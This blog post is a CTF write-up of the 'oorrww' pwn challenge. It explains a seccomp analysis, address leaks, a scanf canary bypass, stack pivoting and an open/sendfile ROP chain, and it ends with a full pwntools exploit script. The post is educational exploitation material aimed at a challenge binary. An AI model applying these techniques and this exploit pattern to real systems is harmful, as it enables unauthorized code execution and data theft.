+++
title = "OORRWW"
date = 2024-01-15
description = "Post description"
+++

## Challenge
**open/read/write or just open&send**

This is a pwn challenge from the **l3akCTF** first edition.

We are given an ELF binary, a libc, a Dockerfile and a docker-compose.

## Enumeration:

Running the binary, we get this:

```sh
lenart@xorr0r0:~/ctf/oorrww_dist$ ./oorrww
here are gifts for you: 6.95282314239992e-310 6.606487017994984e-310!
input:
```

There are some double values that seem important, but we don't know what they are just yet.
It then takes our input, and seemingly it takes numbers as input, not chars.

After playing around a bit, I realized it takes input in a loop, and after 22 inputs, it just crashes:

```sh
*** stack smashing detected ***: terminated
```

Great, but it looks like there is the stack canary enabled which makes it harder to create a classical
buffer overflow.

```sh
RELRO         Full RELRO
STACK CANARY  Canary found
NX            NX enabled
PIE           PIE enabled
```

Let's finally open it in Binja.

The main function:

```c
000013b2  int64_t main()

000013c1      int32_t rdi
000013c1      int32_t var_bc = rdi
000013c7      int64_t rsi
000013c7      int64_t var_c8 = rsi
000013ce      void* fsbase
000013ce      int64_t rax = *(fsbase + 0x28)
000013e2      init()
000013ec      sandbox()
000013fb      void var_a8
000013fb      gifts(&var_a8)
00001455      for (int32_t i = 0; i s<= 0x15; i = i + 1)
00001416          puts("input:")
00001442          __isoc99_scanf(&data_2035, sx.q(i << 3) + &var_a8, &var_a8)
00001457      int64_t rax_8 = 0
00001469      if (rax != *(fsbase + 0x28))
0000146b          rax_8 = __stack_chk_fail()
00001471      return rax_8
```

Seeing the `sandbox()` function I realized not only it is protected by the stack canary and the other compiler's protections
but also seemingly there is some sandboxing security measures.

```sh
lenart@xorr0r0:~/ctf/oorrww_dist$ seccomp-tools dump ./oorrww
 line  CODE  JT   JF      K
###==============================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x02 0x00 0x0000003b  if (A ## execve) goto 0008
 0006: 0x15 0x01 0x00 0x00000142  if (A ## execveat) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
```

The trick to bypass seccomp rules is, If it doesn't check for the arch type, we could simply call another arch instruction,
for example, call int 0x80 instead of syscall, or if it didn't check for the syscall number greater than `0x40000000`,
we could pass `0x40000000 + SYSCALL_NUMBER` because apparently the Linux kernel ignores the high-order bits in the syscall number.
Another trick is to find other alternative system calls.

The challenge name gives some hints, `oorrww` is an abbreviation for `open/read/write`.

Getting back to Binja, we have:

```c
main()
...
gifts(&var_a8)
...

00001331  int64_t gifts(int64_t arg1)
00001341      void* fsbase
00001341      int64_t rax = *(fsbase + 0x28)
00001357      int64_t (* const var_28)() = __isoc99_scanf
0000137e      int512_t zmm1
0000137e      zmm1.o = zx.o(__isoc99_scanf)
00001396      printf("here are gifts for you: %.16g %.…", arg1, zmm1)
000013a0      int64_t rax_4 = rax - *(fsbase + 0x28)
000013a9      if (rax != *(fsbase + 0x28))
000013ab          rax_4 = __stack_chk_fail()
000013b1      return rax_4
```

So, the program leaks the address of the `var_a8` (which is the buffer where we write), and `__isoc99_scanf`.
Here is a script to convert the leaked addresses to hex:

```py
fleak = io.recvline().strip().decode().split()
buffer_leak = float.hex(float(fleak[5]))
buffer_leak = int(buffer_leak[5:17], 16)

scanf_leak = float.hex(float(fleak[6][:-1]))
scanf_leak = int(scanf_leak[5:17], 16)
```

Next, in the binary, we have:

```c
00001455      for (int32_t i = 0; i s<= 0x15; i = i + 1)
00001416          puts("input:")
00001442          __isoc99_scanf(&data_2035, sx.q(i << 3) + &var_a8, &var_a8)
```

It takes our inputs up to 22 times, and it will eventually overflow the buffer.

We can use a trick to bypass the stack canary by confusing the `scanf` function[1]:

1: [pwn> scanf and hateful dot](https://rehex.ninja/posts/scanf-and-hateful-dot/)

```
+--------+
| AAAAAA | <- start of the buffer
|   A    |
|   A    |
|   A    |
|   A    |
|   A    |
|   .    | <- Bypass the canary because scanf wouldn't write .
| 0x1337 | <- return address we can control and jump wherever we want
+--------+
```

Now we have to deal with the fact that we only have 22 inputs, each of 8 bytes;
this means we only have one byte after the stack canary.

We can use the stack pivoting technique[2] to control a larger stack using the following gadget.

2: [leave](https://ir0nstone.gitbook.io/notes/binexp/stack/stack-pivoting/exploitation/leave)

```sh
lenart@xorr0r0:~/ctf/oorrww_dist$ ROPgadget --binary oorrww
0x00000000000012a3 : leave ; ret
```

That is good, we can fill our buffer with a ROP chain and then pivot the stack to the start of the buffer.

Here is what happens to the stack:

```
+---------+
|    A    | <- start of the buffer
|    A    |
|    A    |
|    A    |
|    A    |
|    A    |
|    .    | <- Bypass the canary because scanf woudldn't write .
|  0x1337 | <- address of leave; ret ---->----
+---------+                                  |
                                             |
                 rbp aka base pointer ->  +------+ <- A stack that we don't control
                                          |      |
                                          |      |
                                          |      |
                                          +------+
```

Here is what is happening when calling `leave; ret` instruction:

```asm
mov rsp, rbp
pop rbp
```

## Leak libc and exploit using ROP chain:

### Leak libc:

We can get the libc base address using the `scanf` leaked address.

```
libc.base = scanf_leaked_address - scanf_offset_in_libc
```

And from this we can find every gadget in the libc using `libc.base + gadget_offset`.

### ROP chain:

The idea of ROP chain is as following:

```asm
pop rax     ; move the first value in the stack into rax
ret         ; pop return address from rbp and return to it.
```

We can chain the gadgets to control the registers and call the system calls or libc functions.

EX:

```
Addresses |                                        The stack
          |                                 +--------------------+
          | pop rax ----------------------> |         2          |
          |                                 +--------------------+
          | ret --------------------------> |        0x42        |
          |                                 +--------------------+
  0x42    | pop rdi ----------------------> | 0x7478742e67616c66 + -> flag.txt----> The addresss pointing to flag.txt
          |                                 +--------------------+
          | ret --------------------------> |       0x1337       |
          |                                 +--------------------+
 0x1337   | pop rsi ----------------------> |         0          |
          |                                 +--------------------+
          | ret --------------------------> |      0xca11        |
          |                                 +--------------------+
 0xca11   | syscall
```

The above figure shows how to set some registers and call open syscall. Under linux x64_86, each syscall
has a specific number and the rax register used to register the number of the desired syscall, which is 2
in the case of `open` according linux system call table[3].
If you want to see them by yourself, you can navigate somewhere around `/usr/src/(kernel_name)/arch/x86/entry/syscalls/syscall_64.tbl`.

3: [Linux syscall table](https://filippo.io/linux-syscall-table/)

### The strategy

1. We can only write eight bytes at a time, so we can write `flag.txt` at the start of our buffer as this strings
is required by the open syscall, and we don't have it in the binary file.
2. Open requires a null terminated string. However, the stack has garbage on it, so when writing it at the start of the stack,
it is not null terminated, so the next eight bytes should contain a null byte.
3. Having `flag.txt\0` on the top of the stack. We can fill the rest of the stack with a rop chain to open/read/write it.
4. bypass the canary with a `.`.
5. We have an extra 16 bytes to pivot the stack and change `ret` address. First, we put the address of the buffer
leaked by the program  `+ 8` (We don't want to jump to 0x0 null byte terminator of flag.txt as it is at the top of the stack)
so `leave` will pivot our stack to the start of our rop chain.
6. We change the `ret` to the `leave; ret` gadget address.

We still have a tiny stack space in which we can't fit `open/read/write` system calls.

Instead, we can open the flag file and use `sendfile` system call, saving us some space on the stack.

The man of `sendfile` says:
```man
       sendfile() copies data between one file descriptor and another.
       Because this copying is done within the kernel, sendfile() is
       more efficient than the combination of read(2) and write(2),
       which would require transferring data to and from user space.

       in_fd should be a file descriptor opened for reading and out_fd
       should be a descriptor opened for writing.
```

The `sendfile` prototype is:
```c
ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
```

```asm
%rax 40
%rdi int out_fd
%rsi int in_fd
%rdx loff_t *offset
%r10  size_t count
```

And we have this gadget to control the registers:
```asm
0x0000000000119170: endbr64; mov r10, rcx; mov eax, 0x28; syscall;
```

### Exploitation
With all that, here is the final unformatted script:

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import struct

#context.terminal = 'kitty'
context.terminal = ["tmux", "splitw", "-h"]
logger = logging.getLogger(__name__)

exe = context.binary = ELF(args.EXE or './oorrww_patched')
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

io = process([exe.path])
#io = remote('193.148.168.30', 7666)
#gdb.attach(io, gdbscript=gdbscript)

fleak = io.recvline().strip().decode().split()
buffer_leak = float.hex(float(fleak[5]))
buffer_leak = int(buffer_leak[5:17], 16)

scanf_leak = float.hex(float(fleak[6][:-1]))
scanf_leak = int(scanf_leak[5:17], 16)

libc.address = scanf_leak - libc.symbols['__isoc99_scanf']
print("LIBC @ {}".format(hex(libc.address)))

rop = ROP(libc)
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
pop_rsi = (rop.find_gadget(['pop rsi', 'ret']))[0]
pop_rax = (rop.find_gadget(['pop rax', 'ret']))[0]
pop_rdx = libc.address + 0x11f2e7
syscall = (rop.find_gadget(['syscall', 'ret']))[0]
leave_ret = (rop.find_gadget(['leave', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

gdbscript="""
b *{}
b *{}
""".format(leave_ret, syscall)
#gdb.attach(io, gdbscript=gdbscript)

def pack_input(data):
    val = p64(data).hex()
    return (struct.unpack('d', bytes.fromhex(val))[0])

def create_string(string):
    f = string.encode().hex()
    ba = bytearray.fromhex(f)
    ba.reverse()
    s = ''.join(format(x, "02x") for x in ba)
    return s

def send_address(addr):
    io.sendline("{}".format(pack_input(addr)))

print("Addr: scanf({}) buffer({})".format(hex(scanf_leak), hex(buffer_leak)))
def overflow(r):
    send_address(0x007478742e67616c66)
    send_address(0x00)

    # Open
    send_address(pop_rdi)
    send_address(buffer_leak)
    send_address(pop_rsi)
    send_address(0x0)
    send_address(pop_rax)
    send_address(0x2)
    send_address(syscall)

    # sendfile
    send_address(libc.address + 0x000000000003d1ee)
    send_address(0x200)
    send_address(pop_rsi)
    send_address(0x3)
    send_address(pop_rdi)
    send_address(1)
    send_address(libc.address + 0x0000000000119170)

    send_address(libc.sym.read)

    send_address(libc.sym.write)
    send_address(pop_rdi)

    # Bypass the canary
    io.sendline(b".")
    io.sendline("{}".format(pack_input(buffer_leak + 8)))


def first_stage():
    overflow(0);
    io.sendline("{}".format(pack_input(leave_ret)))

first_stage()
io.interactive()
```
